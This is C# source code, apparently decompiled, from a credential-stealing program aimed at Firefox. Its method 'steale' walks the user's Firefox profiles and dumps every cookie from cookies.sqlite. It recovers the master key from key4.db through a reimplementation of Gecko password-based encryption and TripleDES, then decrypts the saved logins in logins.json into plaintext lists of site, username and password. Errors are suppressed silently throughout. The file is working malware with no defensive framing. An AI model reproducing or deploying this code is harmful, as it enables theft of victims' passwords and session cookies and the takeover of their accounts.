using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using XFiles.Models.Yeti;
using sexas;
using sexas.Logic.Extensions;
using sexas.Logic.Json;

namespace hostik;

internal class FF
{
	public class Cookies_Collect
	{
		public List<string> cookies = new List<string>();

		public static List<Cookies_Collect> coo_s = new List<Cookies_Collect>();

		public string browser { get; set; }

		public string profile { get; set; }
	}

	public static class TripleDESHelper
	{
		public static string Decrypt(byte[] key, byte[] iv, byte[] input, PaddingMode paddingMode = PaddingMode.None)
		{
			using TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = key;
			tripleDESCryptoServiceProvider.IV = iv;
			tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
			tripleDESCryptoServiceProvider.Padding = paddingMode;
			using ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(key, iv);
			return Encoding.Default.GetString(cryptoTransform.TransformFinalBlock(input, 0, input.Length));
		}
	}

	public static class Asn1Factory
	{
		public static ass Create(byte[] dataToParse)
		{
			ass ass = new ass();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				switch (dataToParse[i])
				{
				case 48:
				{
					byte[] array3;
					if (ass.ObjectLength == 0)
					{
						ass.ObjectType = assType.Sequence;
						ass.ObjectLength = dataToParse.Length - (i + 2);
						array3 = new byte[ass.ObjectLength];
					}
					else
					{
						ass.Objects.Add(new ass
						{
							ObjectType = assType.Sequence,
							ObjectLength = dataToParse[i + 1]
						});
						array3 = new byte[dataToParse[i + 1]];
					}
					int length = ((array3.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array3.Length);
					Array.Copy(dataToParse, i + 2, array3, 0, array3.Length);
					ass.Objects.Add(Create(array3));
					i = i + 1 + dataToParse[i + 1];
					break;
				}
				case 2:
				{
					ass.Objects.Add(new ass
					{
						ObjectType = assType.Integer,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array2 = new byte[dataToParse[i + 1]];
					int length = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array2, 0, length);
					ass.Objects[ass.Objects.Count - 1].ObjectData = array2;
					i = i + 1 + ass.Objects[ass.Objects.Count - 1].ObjectLength;
					break;
				}
				case 4:
				{
					ass.Objects.Add(new ass
					{
						ObjectType = assType.OctetString,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array4 = new byte[dataToParse[i + 1]];
					int length = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array4, 0, length);
					ass.Objects[ass.Objects.Count - 1].ObjectData = array4;
					i = i + 1 + ass.Objects[ass.Objects.Count - 1].ObjectLength;
					break;
				}
				case 6:
				{
					ass.Objects.Add(new ass
					{
						ObjectType = assType.ObjectIdentifier,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					int length = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					ass.Objects[ass.Objects.Count - 1].ObjectData = array;
					i = i + 1 + ass.Objects[ass.Objects.Count - 1].ObjectLength;
					break;
				}
				}
			}
			return ass;
		}
	}

	public class GeckoPasswordBasedEncryption
	{
		private byte[] _globalSalt { get; }

		private byte[] _masterPassword { get; }

		private byte[] _entrySalt { get; }

		public byte[] DataKey { get; private set; }

		public byte[] DataIV { get; private set; }

		public GeckoPasswordBasedEncryption(byte[] salt, byte[] password, byte[] entry)
		{
			_globalSalt = salt;
			_masterPassword = password;
			_entrySalt = entry;
		}

		public void Init()
		{
			SHA1CryptoServiceProvider sHA1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[_globalSalt.Length + _masterPassword.Length];
			Array.Copy(_globalSalt, 0, array, 0, _globalSalt.Length);
			Array.Copy(_masterPassword, 0, array, _globalSalt.Length, _masterPassword.Length);
			byte[] array2 = sHA1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + _entrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(_entrySalt, 0, array3, array2.Length, _entrySalt.Length);
			byte[] key = sHA1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(_entrySalt, 0, array4, 0, _entrySalt.Length);
			for (int i = _entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + _entrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(_entrySalt, 0, array5, array4.Length, _entrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hMACSHA = new HMACSHA1(key))
			{
				array6 = hMACSHA.ComputeHash(array5);
				byte[] array7 = hMACSHA.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + _entrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(_entrySalt, 0, array8, array7.Length, _entrySalt.Length);
				array9 = hMACSHA.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			DataKey = new byte[24];
			for (int j = 0; j < DataKey.Length; j++)
			{
				DataKey[j] = array10[j];
			}
			DataIV = new byte[8];
			int num = DataIV.Length - 1;
			for (int num2 = array10.Length - 1; num2 >= array10.Length - DataIV.Length; num2--)
			{
				DataIV[num] = array10[num2];
				num--;
			}
		}
	}

	public static List<string> Passwords = new List<string>();

	public static List<string> Browsers = new List<string>();

	public static List<string> Cookies = new List<string>();

	public static List<string> webForms = new List<string>();

	public static List<string> ccc = new List<string>();

	public static readonly byte[] Key4MagicNumber = new byte[16]
	{
		248, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 1
	};

	private static string GetName(string path)
	{
		return path.Split(new string[1] { "\\" }, StringSplitOptions.RemoveEmptyEntries)[^3];
	}

	private static string GetProfile(string path)
	{
		return path.Split(new string[1] { "\\" }, StringSplitOptions.RemoveEmptyEntries)[^1];
	}

	private static void GetCookies(string path, string name, string profile)
	{
		try
		{
			if (!File.Exists(path))
			{
				return;
			}
			Sqlite sqlite = new Sqlite(path);
			if (!sqlite.ReadTable("moz_cookies"))
			{
				return;
			}
			int rowCount = sqlite.GetRowCount();
			if (rowCount <= 0)
			{
				return;
			}
			new List<string>();
			for (int i = 0; i < rowCount; i++)
			{
				try
				{
					string value = sqlite.GetValue(i, "value");
					string value2 = sqlite.GetValue(i, "host");
					string value3 = sqlite.GetValue(i, "name");
					string value4 = sqlite.GetValue(i, "path");
					string value5 = sqlite.GetValue(i, "creationTime");
					string value6 = sqlite.GetValue(i, "isSecure");
					string text = "TRUE";
					string text2 = ((!(value6 == "0")) ? "TRUE" : "FALSE");
					Cookies.Add(value2 + "\t" + text + "\t" + value4 + "\t" + text2 + "\t" + value5 + "\t" + value3 + "\t" + value + "\n");
					BIR.Coci++;
				}
				catch
				{
				}
			}
			Cookies_Collect.coo_s.Add(new Cookies_Collect
			{
				browser = name,
				profile = profile,
				cookies = Cookies
			});
		}
		catch
		{
		}
	}

	public static void steale()
	{
		string[] array = new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles" };
		try
		{
			string[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				if (!Directory.Exists(array2[i]))
				{
					continue;
				}
				string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
				foreach (string text in directories)
				{
					try
					{
						string profile = GetProfile(text);
						string name = "Firefox Mozilla";
						GetCookies(text + "\\cookies.sqlite", name, profile);
						if (!File.Exists(text + "\\logins.json"))
						{
							continue;
						}
						byte[] key = null;
						if (File.Exists(Path.Combine(text, "key3.db")))
						{
							key = GetPrivate3Key();
						}
						if (File.Exists(Path.Combine(text, "key4.db")))
						{
							key = GetPrivate4Key(Path.Combine(text, "key4.db"));
						}
						string path = Path.Combine(text, "logins.json");
						if (!File.Exists(path))
						{
							continue;
						}
						foreach (JsonValue item in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
						{
							ass ass = Asn1Factory.Create(Convert.FromBase64String(item["encryptedUsername"].ToString(saving: false)));
							ass ass2 = Asn1Factory.Create(Convert.FromBase64String(item["encryptedPassword"].ToString(saving: false)));
							string text2 = Regex.Replace(TripleDESHelper.Decrypt(key, ass.Objects[0].Objects[1].Objects[1].ObjectData, ass.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
							string text3 = Regex.Replace(TripleDESHelper.Decrypt(key, ass2.Objects[0].Objects[1].Objects[1].ObjectData, ass2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
							Passwords.Add("Website: " + item["hostname"].ToString(saving: false) + Environment.NewLine + "Login: " + text2 + Environment.NewLine + "Password: " + text3 + "\n");
							BIR.pass++;
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private static byte[] GetPrivate4Key(string file)
	{
		byte[] result = new byte[24];
		try
		{
			if (!File.Exists(file))
			{
				return result;
			}
			Sqlite sqlite = new Sqlite(file);
			sqlite.ReadTable("metaData");
			string value = sqlite.GetValue(0, "item1");
			string value2 = sqlite.GetValue(0, "item2)");
			ass ass = Asn1Factory.Create(Encoding.Default.GetBytes(value2));
			byte[] objectData = ass.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			byte[] objectData2 = ass.Objects[0].Objects[1].ObjectData;
			GeckoPasswordBasedEncryption geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(Encoding.Default.GetBytes(value), Encoding.Default.GetBytes(string.Empty), objectData);
			geckoPasswordBasedEncryption.Init();
			TripleDESHelper.Decrypt(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, objectData2);
			sqlite.ReadTable("nssPrivate");
			int rowCount = sqlite.GetRowCount();
			string s = string.Empty;
			for (int i = 0; i < rowCount; i++)
			{
				if (sqlite.GetValue(i, "a102") == Encoding.Default.GetString(Key4MagicNumber))
				{
					s = sqlite.GetValue(i, "a11");
					break;
				}
			}
			ass ass2 = Asn1Factory.Create(Encoding.Default.GetBytes(s));
			objectData = ass2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			objectData2 = ass2.Objects[0].Objects[1].ObjectData;
			geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(Encoding.Default.GetBytes(value), Encoding.Default.GetBytes(string.Empty), objectData);
			geckoPasswordBasedEncryption.Init();
			result = Encoding.Default.GetBytes(TripleDESHelper.Decrypt(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, objectData2, PaddingMode.PKCS7));
			return result;
		}
		catch
		{
			return result;
		}
	}

	private static byte[] GetPrivate3Key()
	{
		byte[] result = new byte[24];
		try
		{
			return null;
		}
		catch
		{
			return result;
		}
	}
}
